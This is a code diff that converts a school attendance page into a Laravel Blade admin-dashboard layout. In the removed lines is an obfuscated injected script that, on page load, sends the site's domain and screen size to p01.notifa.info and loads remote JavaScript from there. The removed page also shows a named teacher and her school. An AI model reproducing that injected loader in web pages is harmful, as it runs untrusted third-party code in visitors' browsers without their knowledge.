@@ -1,209 +1,91 @@
-@extends('layouts.appp')
-
-@section('content')
-
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
+    <!-- Required meta tags-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="au theme template">
+    <meta name="author" content="Hau Nguyen">
+    <meta name="keywords" content="au theme template">
 
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Title Page-->
+    <title>Dashboard</title>
 
-    <title>SISTEM ABSENSI REAL TIME</title>
+    <!-- Fontfaces CSS-->
+    <link href="/assets/admin/css/font-face.css" rel="stylesheet" media="all">
+    <link href="/assets/admin/vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
+    <link href="/assets/admin/vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
+    <link href="/assets/admin/vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">
 
-    <!-- Core CSS - Include with every page -->
-    <link href="css/bootstrap.min.css" rel="stylesheet">
-    <link href="font-awesome/css/font-awesome.css" rel="stylesheet">
+    <!-- Bootstrap CSS-->
+    <link href="/assets/admin/vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">
 
-    <!-- Page-Level Plugin CSS - Tables -->
-    <link href="css/plugins/dataTables/dataTables.bootstrap.css" rel="stylesheet">
+    <!-- Vendor CSS-->
+    <link href="/assets/admin/vendor/animsition/animsition.min.css" rel="stylesheet" media="all">
+    <link href="/assets/admin/vendor/bootstrap-progressbar/bootstrap-progressbar-3.3.4.min.css" rel="stylesheet" media="all">
+    <link href="/assets/admin/vendor/wow/animate.css" rel="stylesheet" media="all">
+    <link href="/assets/admin/vendor/css-hamburgers/hamburgers.min.css" rel="stylesheet" media="all">
+    <link href="/assets/admin/vendor/slick/slick.css" rel="stylesheet" media="all">
+    <link href="/assets/admin/vendor/select2/select2.min.css" rel="stylesheet" media="all">
+    <link href="/assets/admin/vendor/perfect-scrollbar/perfect-scrollbar.css" rel="stylesheet" media="all">
 
-    <!-- SB Admin CSS - Include with every page -->
-    <link href="css/sb-admin.css" rel="stylesheet">
-
+    <!-- Main CSS-->
+    <link href="/assets/admin/css/theme.css" rel="stylesheet" media="all">
+    @yield('css')
 </head>
 
-<body>
+<body class="animsition">
+    <div class="page-wrapper">
+        <!-- HEADER MOBILE-->
+    @include('partials.hd-mobile')
+        <!-- END HEADER MOBILE-->
+        <!-- MENU SIDEBAR-->
+    @include('partials.sidebarpetugas')
+        
+        <!-- END MENU SIDEBAR-->
 
-    <div id="wrapper">
+        <!-- PAGE CONTAINER-->
+        <div class="page-container">
+            <!-- HEADER DESKTOP-->
+    @include('partials.hd-desktop')
+           
+           <!-- HEADER DESKTOP-->
 
-        <nav class="navbar navbar-default navbar-fixed-top" role="navigation" style="margin-bottom: 0">
-            <div class="navbar-header">
-                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
-                    <span class="sr-only">Toggle navigation</span>
-                    <span class="icon-bar"></span>
-                    <span class="icon-bar"></span>
-                    <span class="icon-bar"></span>
-                </button>
-                <a class="navbar-brand" href="media.php?module=home">SISTEM ABSENSI REAL TIME</a>
-            </div>
-            <!-- /.navbar-header -->
-
-            <ul class="nav navbar-top-links navbar-right">
-                <li class="dropdown">
-                    <a class="dropdown-toggle" data-toggle="dropdown" href="#">
-User : Ghaluh Ayu Imas Larasati, S. Pd. 
-
-                   </a>
-                </li>
-       <li class="dropdown">
-                    <a class="dropdown-toggle" data-toggle="dropdown" href="#">
-Sekolah : Madrasah Tsanawiyah Negeri Sidoharjo | XII 
-                   </a>
-                </li>
-
-<li class="dropdown">
-                    <a class="dropdown-toggle" data-toggle="" href="logout.php">
-Logout 
-                   </a>
-                </li>                
-                <li class="dropdown">
-                    <a class="dropdown-toggle" data-toggle="dropdown" href="#">
-Tanggal : 02-06-2018 
-                   </a>
-                </li>
-                <!-- /.dropdown -->
-            </ul>
-            <!-- /.navbar-top-links -->
-
-            <div class="navbar-default navbar-static-side" role="navigation">
-                <div class="sidebar-collapse">
-                    <ul class="nav" id="side-menu">
-                        <li class="sidebar-search">
-                            <div class="input-group custom-search-form">
-                                <input type="text" class="form-control" placeholder="Search...">
-                                <span class="input-group-btn">
-                                <button class="btn btn-default" type="button">
-                                    <i class="fa fa-search"></i>
-                                </button>
-                            </span>
-                            </div>
-                            <!-- /input-group -->
-                        </li>
-
-
-
-
-                        <li>
-                            <a href="#"><i class="fa fa-bar-chart-o fa-fw"></i> Data Absensi<span class="fa arrow"></span></a>
-                            <ul class="nav nav-second-level">
-                                <li>
-                                    <a href="media.php?module=pilih">Input Data</a>
-                                </li>
-                            </ul>
-                            <!-- /.nav-second-level -->
-                        </li>
-
-
-                        <li>
-                            <a href="media.php?module=guru_det"><i class="fa fa-dashboard fa-fw"></i> Data Guru</a>
-                        </li>
-      
-                    </ul>
-                    <!-- /#side-menu -->
-                </div>
-                <!-- /.sidebar-collapse -->
-            </div>
-            <!-- /.navbar-static-side -->
-        </nav>
-
-        <div id="page-wrapper">
-          <div class="row">
-                <div class="col-lg-12">
-					<h3 class="page-header"><strong>Input Data Absensi</strong></h3>
-                </div>
-                <!-- /.col-lg-12 -->
-            </div>
-            <!-- /.row -->
-            <div class="row">
-                <div class="col-lg-12">
-                    <div class="panel panel-default">
-                        <div class="panel-heading">
-                            Pilih Kelas
-                        </div>
-                        <div class="panel-body">
-                            <div class="row">
-                                    <form method="get" role="form" action="././media.php?module=input_absen&jam=1">
-                                <div class="col-lg-6">
-<input type="hidden" name="module" value="input_absen">
-<input type="hidden" name="jam" value="1">
-
-                                        <div class="form-group">
-                                            <label>Kelas</label>
-                                            <select class="form-control" name="kls">
-
-  <option value='10'>Madrasah Tsanawiyah Negeri Sidoharjo | XII</option>                                            </select>
-                                        </div>
-                                        
-                                <div class="col-lg-4">
-
-                                        <div class="form-group">
-                                            <label>Tanggal</label>
-                                            <select class="form-control" name="tanggal">
-<option>1</option><option selected>2</option><option>3</option><option>4</option><option>5</option><option>6</option><option>7</option><option>8</option><option>9</option><option>10</option><option>11</option><option>12</option><option>13</option><option>14</option><option>15</option><option>16</option><option>17</option><option>18</option><option>19</option><option>20</option><option>21</option><option>22</option><option>23</option><option>24</option><option>25</option><option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option>                                         </select>
-                                        </div>
-</div>         
-                                <div class="col-lg-4">
-
-                                        <div class="form-group">
-                                            <label>Bulan</label>
-                                            <select class="form-control" name="bulan">
-<option>1</option><option>2</option><option>3</option><option>4</option><option>5</option><option selected>6</option><option>7</option><option>8</option><option>9</option><option>10</option><option>11</option><option>12</option>                                            </select>
-                                        </div>
-</div>         
-                                <div class="col-lg-4">
-
-                                        <div class="form-group">
-                                            <label>Tahun</label>
-                                            <select class="form-control" name="tahun">
-<option>2000</option><option>2001</option><option>2002</option><option>2003</option><option>2004</option><option>2005</option><option>2006</option><option>2007</option><option>2008</option><option>2009</option><option>2010</option><option>2011</option><option>2012</option><option>2013</option><option>2014</option><option>2015</option><option>2016</option><option>2017</option><option selected>2018</option><option>2019</option><option>2020</option><option>2021</option><option>2022</option><option>2023</option><option>2024</option><option>2025</option><option>2026</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option><option>2031</option><option>2032</option><option>2033</option><option>2034</option><option>2035</option><option>2036</option><option>2037</option><option>2038</option><option>2039</option><option>2040</option><option>2041</option><option>2042</option><option>2043</option><option>2044</option><option>2045</option><option>2046</option><option>2047</option><option>2048</option><option>2049</option><option>2050</option>                                            </select>
-                                        </div>
-</div>         
-
-                                        <button type="submit" class="btn btn-default">Submit Button</button>
-
-                                </div>
-                                <!-- /.col-lg-6 (nested) -->
-                                    </form>
-
-                            </div>
-                            <!-- /.row (nested) -->
-                        </div>
-                        <!-- /.panel-body -->
-                    </div>
-                    <!-- /.panel -->
-                </div>
-                <!-- /.col-lg-12 -->
-            </div>
-            <!-- /.row -->        </div>
-        <!-- /#page-wrapper -->
-
+            <!-- MAIN CONTENT-->
+            <div class="main-content">
+    @yield('content')
+           
+        <!-- END PAGE CONTAINER-->
+        </div>
+</div>
     </div>
-    <!-- /#wrapper -->
 
-    <!-- Core Scripts - Include with every page -->
-    <script src="js/jquery-1.10.2.js"></script>
-    <script src="js/bootstrap.min.js"></script>
-    <script src="js/plugins/metisMenu/jquery.metisMenu.js"></script>
-
-    <!-- Page-Level Plugin Scripts - Tables -->
-    <script src="js/plugins/dataTables/jquery.dataTables.js"></script>
-    <script src="js/plugins/dataTables/dataTables.bootstrap.js"></script>
-
-    <!-- SB Admin Scripts - Include with every page -->
-    <script src="js/sb-admin.js"></script>
-
-    <!-- Page-Level Demo Scripts - Tables - Use for reference -->
-    <script>
-    $(document).ready(function() {
-        $('#dataTables-example').dataTable();
-    });
+    <!-- Jquery JS-->
+    <script src="/assets/admin/vendor/jquery-3.2.1.min.js"></script>
+    <!-- Bootstrap JS-->
+    <script src="/assets/admin/vendor/bootstrap-4.1/popper.min.js"></script>
+    <script src="/assets/admin/vendor/bootstrap-4.1/bootstrap.min.js"></script>
+    <!-- Vendor JS       -->
+    <script src="/assets/admin/vendor/slick/slick.min.js">
+    </script>
+    <script src="/assets/admin/vendor/wow/wow.min.js"></script>
+    <script src="/assets/admin/vendor/animsition/animsition.min.js"></script>
+    <script src="/assets/admin/vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
+    </script>
+    <script src="/assets/admin/vendor/counter-up/jquery.waypoints.min.js"></script>
+    <script src="/assets/admin/vendor/counter-up/jquery.counterup.min.js">
+    </script>
+    <script src="/assets/admin/vendor/circle-progress/circle-progress.min.js"></script>
+    <script src="/assets/admin/vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
+    <script src="/assets/admin/vendor/chartjs/Chart.bundle.min.js"></script>
+    <script src="/assets/admin/vendor/select2/select2.min.js">
     </script>
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mnXfyekY6omkjFB7%2byNh3jtnGzah7FC4pTAbKLPAWPqOySvtHkQY%2bBvzImhSAkA3VMy0%2bw5irebobZiysUhZCe2xNDyVy%2bmImoVDEB4HGEYzJFfyulleVgLMVsdjPKMW6Ov0m2zemPgePzK3imFmQNoxhCYr8tg86jJsNR4AW1QiIj7p56ZIf3poeH8cqhEIFNZPP25mqPhpnV7darXhTIvEpZq5yaK%2f1BGsO3xMBtTijLskMET5heUELY%2fiEX7e9pfsE6%2bMQzxuoLjaiWbsA2QMTqscyd1DziWpOLFIn%2fsfVu3GTj2YunQJpYgke08UTXx0KUyAVHrWzQKYX1%2bN9OSgC%2fi4Ac7Wr0H4PlxukijiN2NHa3XDVOAh7NE0Gk9JPL82agFQ7WkvK0ChmJaiHbqDMfnGMGCM1Q6RC%2fWA6Pyo1DrierauCOam5F%2fy%2bQQvlRis9z1OBkOhJ7IOHSwQeeNdbQfbxTV%2bNhvRRFxaReRBzRNC3FAauXmyZS5U5gPKLrS0mfHXOGruhxWJgOYAMbqUFV0%2fQVcVumttrBniApfiy1ugwT99QiRsDgj%2fAReToVJopyYdzGz4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+    <!-- Main JS-->
+    <script src="/assets/admin/js/main.js"></script>
+    @yield('js')
+</body>
 
 </html>
-
-@endsection
+<!-- end document-->
